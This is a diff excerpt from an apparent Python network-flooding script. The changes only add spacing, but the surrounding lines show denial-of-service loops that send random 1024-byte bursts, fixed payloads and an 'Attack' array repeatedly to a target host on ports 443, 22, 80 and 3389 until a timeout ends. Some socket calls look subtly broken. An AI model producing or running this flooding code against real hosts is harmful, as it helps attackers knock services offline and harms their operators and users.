@@ -96,20 +96,20 @@ def start(host, port, times):
         sock.send(msg, (host, int(port)))    
         sock.send(packets, (host, int(port)))
         if int(port) == 443:
-            sock.send(Attack[5],(host,int(port)))
+            sock.send(Attack[5],(host, int(port)))
         elif int(port) == 22:
-            sock.send(Attack[4],(host,int(port)))
+            sock.send(Attack[4],(host, int(port)))
         elif int(port) == 80:
-            sock.send(Attack[6],(host,int(port)))
+            sock.send(Attack[6],(host, int(port)))
 
 def randsender(host, port, times):
     timeout = time.time() + float(times)
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.IPPROTO_TCP)
     punch = random._urandom(int(1024))
     while time.time() < timeout:
-          sock.send(punch, (host,int(port)))
-          sock.send(punch, (host,int(port)))
-          sock.send(punch, (host,int(port)))
+          sock.send(punch, (host, int(port)))
+          sock.send(punch, (host, int(port)))
+          sock.send(punch, (host, int(port)))
 def stdsender(host, times):
     timeout = time.time() + float(times)
     sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -117,9 +117,9 @@ def stdsender(host, times):
     payload = b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00'
     port = '3389'
     while time.time() < timeout:
-          sock.send(payload, (host,int(port)))
-          sock.send(payload, (host,int(port)))
-          sock.send(payload, (host,int(port)))
+          sock.send(payload, (host, int(port)))
+          sock.send(payload, (host, int(port)))
+          sock.send(payload, (host, int(port)))
 
 for y in range(th):
     if choice == 'y':
